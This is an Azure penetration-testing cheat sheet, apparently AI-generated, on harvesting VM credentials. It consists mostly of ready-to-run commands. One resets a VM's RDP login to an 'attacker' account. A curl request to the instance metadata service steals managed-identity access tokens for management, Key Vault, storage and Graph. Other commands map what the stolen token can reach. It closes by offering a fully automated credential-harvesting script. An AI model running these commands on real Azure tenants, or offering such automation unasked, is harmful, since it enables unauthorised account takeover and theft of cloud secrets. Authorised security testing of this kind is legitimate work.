# Azure VM Passwords

**Azure PenTest: VM Credential and Metadata Harvesting**

**🧾 Objective**

Simulate post-exploitation credential theft by extracting RDP login
credentials and tokens from **Azure VMs** via:

- RDP configuration analysis

- IMDS (Instance Metadata Service) abuse

- Azure Automation or extensions abuse

**📤 1. Retrieve RDP Passwords from Azure VM Extensions**

**Description**: In Azure, passwords are often injected via **VM Access
Extensions**, which can be misused by attackers to extract or reset RDP
credentials.

**Enumerate Windows VMs with RDP Ports Open (3389):**

az vm list-ip-addresses --output json \| jq -r '.\[\] \|
select(.virtualMachine.network.publicIpAddresses\[\].ipAddress != null)
\| {name: .virtualMachine.name, ip:
.virtualMachine.network.publicIpAddresses\[\].ipAddress}' \| grep -i
"3389"

**🛠️ Extract Reset RDP Credentials (if access to subscription):**

az vm extension list --vm-name \<vm-name\> --resource-group \<rg-name\>
--output json \| jq '.\[\] \| select(.type == "VMAccessAgent")'

Use this to confirm presence of the **VMAccessAgent**, which can reset
passwords if Contributor or VM Contributor role is present.

**🚨 Malicious RDP Password Reset (Post-Exploitation):**

az vm user update --resource-group \<rg-name\> --name \<vm-name\>
--username attacker --password 'P@ssw0rd123'

**Note**: Only works with write access and
Microsoft.Compute/virtualMachines/write permissions.

**🧠 2. Steal Azure VM IAM Credentials via Metadata Service (IMDS)**

Azure VMs expose a metadata service like AWS. If a Managed Identity is
assigned, credentials can be **harvested from within the VM**.

**🧪 Curl IMDS for Token:**

curl -H Metadata:true
"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-01-01&resource=https://management.azure.com"
-s \| jq -r '.access_token'

Replace the resource= with appropriate scopes, such as:

- https://vault.azure.net (for Key Vault)

- https://storage.azure.com (for blob access)

- https://graph.microsoft.com (for Microsoft Graph access)

**🔎 Enumerate Managed Identity Role Assignments:**

az vm identity show --name \<vm-name\> --resource-group \<rg-name\>

az role assignment list --assignee \<principalId\> --all --output json

Useful to map **what this stolen token can access**.

**🧰 Tools for Credential Theft in Azure:**

| **Tool** | **Purpose** |
|----|----|
| **CloudFox** | Enumerates access tokens, roles, and automation misuse |
| **IMDSproxy / imds-client.py** | Exploit IMDS with SSRF or from within shell |
| **BloodHound/AzureHound** | Discover privilege escalation via VM identity |
| **Aztarna** | VM metadata fingerprinting (similar to cloudmapper for Azure) |

**✅ Summary Table**

| **Objective** | **Azure Equivalent** | **Notes** |
|----|----|----|
| Steal EC2 password via PasswordData | Abuse VMAccessAgent extension | Requires write privilege |
| Steal IAM keys from EC2 | Exploit **Azure IMDS** for access tokens | Requires access to running VM |
| CloudMapper for EC2 metadata | Use az vm show + jq or use CloudFox | CloudFox offers deep post-exploit insights |

Would you like a **fully automated script** that checks for VM
identities, tests IMDS access, and outputs token scopes and potential
resource access?
